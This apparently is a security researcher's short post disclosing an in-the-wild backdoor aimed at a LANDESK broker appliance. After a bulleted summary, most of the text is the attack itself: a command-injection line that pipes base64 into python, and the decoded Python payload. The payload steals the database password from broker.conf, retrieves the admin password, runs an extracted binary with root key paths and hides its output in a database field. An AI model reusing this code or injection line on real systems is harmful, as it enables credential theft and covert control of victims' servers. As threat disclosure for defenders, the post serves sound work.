Found basic C2 backdoor in the wild used by an attacker:

- Command execution via PHP webshell
- Data exfiltration via database fields
- Simple persistence and automation

The script:

- Extracts PostgreSQL credentials from /opt/landesk/broker/broker.conf.
- Queries the database to retrieve the admin password.
- Searches for a backup archive in /backups/, extracts its contents, and looks for a PHP file matching php\w{6}.
- Executes the PHP file with stolen credentials, potentially running a remote shell or executing attacker commands.
- Stores results or stolen data inside the user_info table in the database using a base64-encoded message.
- Uses Base64-encoded Python shellcode, which may escalate privileges or deploy additional malware.


```
sh -c sudo ln -sf ;/usr/bin/echo aW1wb3J0IG9zLCByZSwgYmFzZTY0LCB0aW1lCm9zLmNoZGlyKCIvdG1wIikKZCA9ICIvYmFja3VwcyIKZGVmIHNldF9tc2cocCwgdD0nJywgbT0nJyk6CiAgICBpZiB0IGFuZCBtOgogICAgICAgIG1zZyA9ICdBQXt9Ont9QkInLmZvcm1hdCh0LCBiYXNlNjQuYjY0ZW5jb2RlKG0uZW5jb2RlKCkpLmRlY29kZSgpKQogICAgZWxzZToKICAgICAgICBtc2cgPSAnJwogICAgb3Muc3lzdGVtKCcnJ2V4cG9ydCBQR1BBU1NXT1JEPXt9O2VjaG8gInVwZGF0ZSB1c2VyX2luZm8gc2V0IG9yZ2FuaXphdGlvbj0ne30nIHdoZXJlIHVzZXJuYW1lPSdhZG1pbicifHBzcWwgLWQgYnJva2VyZGIgLVUgZ3NiYWRtaW4nJycuZm9ybWF0KHAsIG1zZykpCnRyeToKICAgIHIgPSBtYXgoW29zLnBhdGguam9pbihkLCBmKSBmb3IgZiBpbiBvcy5saXN0ZGlyKGQpIGlmIG9zLnBhdGguaXNmaWxlKG9zLnBhdGguam9pbihkLCBmKSldLCBrZXk9b3MucGF0aC5nZXRtdGltZSkKZXhjZXB0OgogICAgciA9IE5vbmUKd2l0aCBvcGVuKCIvb3B0L2xhbmRlc2svYnJva2VyL2Jyb2tlci5jb25mIikgYXMgZjoKICAgIGRicHdkID0gcmUuZmluZGFsbCgiUEdTUUxfUFc9KC4qKSIsIGYucmVhZCgpKVswXQppZiByOgogICAgcCA9IG9zLnBvcGVuKCJleHBvcnQgUEdQQVNTV09SRD17fTtlY2hvIFNFTEVDVCBwYXNzd2QgRlJPTSB1c2VyX2luZm8gV0hFUkUgdXNlcm5hbWU9XFwnYWRtaW5cXCcgfCBwc3FsIC1kIGJyb2tlcmRiIC1VIGdzYmFkbWluIC1oIGxvY2FsaG9zdCIuZm9ybWF0KGRicHdkKSkucmVhZCgpLnNwbGl0KCJcbiIpWy00XS5zdHJpcCgpLnNwbGl0KCc6JykKICAgIG9zLnN5c3RlbSgidGFyIHp4dmYge30iLmZvcm1hdChyKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZm9yIGYgaW4gb3MubGlzdGRpcignLicpOgogICAgICAgICAgICBpZiByZS5tYXRjaCgicGhwXHd7Nn0iLCBmKToKICAgICAgICAgICAgICAgIG9zLmNobW9kKGYsIDBvNzc3KQogICAgICAgICAgICAgICAgbSA9IG9zLnBvcGVuKCIuL3t9IHt9IHt9IHt9IHJvb3QvLmNlcnRzL3t9LmtleSB7fSIuZm9ybWF0KGYsIHBbNF0sIHBbNV0sIHBbNl0sIHBbMV0sIHBbMV0pKS5yZWFkKCkuc3RyaXAoKQogICAgICAgICAgICAgICAgaWYgbToKICAgICAgICAgICAgICAgICAgICBzZXRfbXNnKGRicHdkLCAiUEFTU1dPUkQiLCBtKQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMzApCiAgICAgICAgICAgICAgICAgICAgc2V0X21zZyhkYnB3ZCkKICAgICAgICAgICAgICAgICAgICBleGl0KCkKZWxzZToKICAgIHNldF9tc2coZGJwd2QsICdFUlJPUicsICdOTyBCQUNLVVAnKQogICAgCiAgICAK | /usr/bin/base64 -d | python; /etc/localtime
```

Decoded B64 payload:
```
import os, re, base64, time
os.chdir("/tmp")
d = "/backups"
def set_msg(p, t='', m=''):
    if t and m:
        msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())
    else:
        msg = ''
    os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))
try:
    r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)
except:
    r = None
with open("/opt/landesk/broker/broker.conf") as f:
    dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]
if r:
    p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')
    os.system("tar zxvf {}".format(r))
    while True:
        for f in os.listdir('.'):
            if re.match("php\w{6}", f):
                os.chmod(f, 0o777)
                m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()
                if m:
                    set_msg(dbpwd, "PASSWORD", m)
                    time.sleep(30)
                    set_msg(dbpwd)
                    exit()
else:
    set_msg(dbpwd, 'ERROR', 'NO BACKUP')
```
    
